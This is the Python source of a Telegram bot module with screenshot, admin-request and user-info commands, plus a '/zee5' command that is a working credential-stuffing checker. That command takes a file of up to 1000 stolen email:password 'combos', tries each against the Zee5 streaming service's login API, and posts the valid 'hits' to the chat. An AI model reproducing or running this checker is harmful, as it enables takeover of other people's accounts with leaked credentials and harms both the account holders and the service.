from Carla import tbot, OWNER_ID
from Carla.events import Cbot
import requests, os
from . import get_user, ELITES, SUDO_USERS
from telethon.tl.functions.photos import GetUserPhotosRequest
from telethon.tl.functions.users import GetFullUserRequest

@Cbot(pattern="^/sshot ?(.*)")
async def _(event):
 BASE = 'https://render-tron.appspot.com/screenshot/'
 url = event.pattern_match.group(1)
 if not url:
   return await event.reply('Please provide the URL.')
 path = 'target.jpg'
 response = requests.get(BASE + url, stream=True)
 if not response.status_code == 200:
   return await event.reply('Invalid URL Provided.')
 else:
    X = await event.reply("Uploading the screenshot...")
    with open(path, 'wb') as file:
        for chunk in response:
            file.write(chunk)
 await tbot.send_file(event.chat_id, path, reply_to=event.id, force_document=True)
 await X.delete()
 os.remove('target.jpg')

@Cbot(pattern="^/request ?(.*)")
async def _(event):
 if not event.is_private:
    return
 args = event.pattern_match.group(1)
 if not args:
   return await event.respond('Include some text in request.')
 await tbot.send_message(-1001273171524, f"**(#)New Request Recieved**\n**From**: [{event.sender.first_name}](tg://user?id={event.sender_id})\n\n**Request:**\n`{args}`")
 await event.respond("Sucessfully notified admins!")

@Cbot(pattern="^/info ?(.*)")
async def _(event):
 if not event.reply_to_msg_id and not event.pattern_match.group(1):
   user = await tbot.get_entity(event.sender_id)
 else:
  try:
   user, extra = await get_user(event)
  except TypeError:
   pass
 user_id = user.id
 first_name = user.first_name
 last_name = user.last_name
 username = user.username
 text = "<b>User Information:</b>\n"
 text += f"<b>ID:</b> <code>{user_id}</code>\n"
 if first_name:
   text += f"<b>First Name:</b> {first_name}\n"
 if last_name:
   text += f"<b>Last Name:</b> {last_name}\n"
 if username:
   text += f"<b>Username:</b> @{username}\n"
 text += f'<b>User link:</b> <a href="tg://user?id={user_id}">{first_name}</a>'
 if user_id == OWNER_ID:
  text += "\n\n<i>This user is my Owner</i>"
 elif user_id in ELITES:
  text += "\n\n<i>This user is one of my Devs</i>"
 elif user_id in SUDO_USERS:
  text += "\n\n<i>This user is one of my Sudo Users</i>"
 print("#")
 await event.reply(text, parse_mode="html")

 
@Cbot(pattern="^/zee5 ?(.*)")
async def zee(event):
    input_str = event.pattern_match.group(1)
    if input_str == "combo":
        ok = await event.reply(
            "`Checking Your Combos File. This May Take Time Depending On No of Combos.`"
        )
        stark_dict = []
        hits_dict = []
        hits = 0
        bads = 0
        lol = await event.get_reply_message()
        if lol == None:
            await ok.edit('Reply To File')
            return
        starky = await tbot.download_media(lol.media, './')
        with open(starky) as f:
            stark_dict = f.read().splitlines()
        if len(stark_dict) > 1000:
            await ok.edit("`Woah, Thats A Lot Of Combos. Keep 1000 As Limit`")
            return
        os.remove(starky)
        for i in stark_dict:
            starkm = i.split(":")
            email = starkm[0]
            password = starkm[1]
            try:
                meke = requests.get(
                    f"https://userapi.zee5.com/v1/user/loginemail?email={email}&password={password}"
                ).json()
            except BaseException:
                meke = None
            if meke.get("token"):
                hits += 1
                hits_dict.append(f"{email}:{password}")
            else:
                bads += 1
        if len(hits_dict) == 0:
            await ok.edit("**0 Hits. Probably, You Should Find Better Combos. LoL**")
            return
        with open("hits.txt", "w") as hitfile:
            for s in hits_dict:
                hitfile.write(s + " | @DevsExpo")
        ok.delete()
        await tbot.send_file(
            event.chat_id,
            "hits.txt",
            caption=f"**!ZEE5 HITS!** \n**HITS :** `{hits}` \n**BAD :** `{bads}`",
        )
        os.remove("hits.txt")
    else:
        if input_str:
            if ":" in input_str:
                stark = input_str.split(":", 1)
            else:
                await event.reply("**! No Lol, use email:pass Regex !**")
                return
        else:
            await event.reply("**Give Combos To Check**")
            return
        email = stark[0]
        password = stark[1]
        meke = requests.get(
            f"https://userapi.zee5.com/v1/user/loginemail?email={email}&password={password}"
        ).json()
        beautifuln = f"""
💖 **Checked Zee5 Account**
**Combo:** {email}:{password}
**Email:** {email}
**Password:-** {password}
**Response:-** This Account Is Invalid. 😔
🔱 **Checked By:-** {event.sender_id}"""

        beautiful = f"""
💖 **Checked Zee5 Account**
**Combo:** {email}:{password}
**Email:** {email}
**Password:-** {password}
**Response:-** This Account Is valid.😀
**Login Here**: www.zee5.com
🔱 **Checked By:-** {event.sender_id}"""
        if meke.get("token"):
            await event.reply(beautiful)
        else:
            await event.reply(beautifuln)
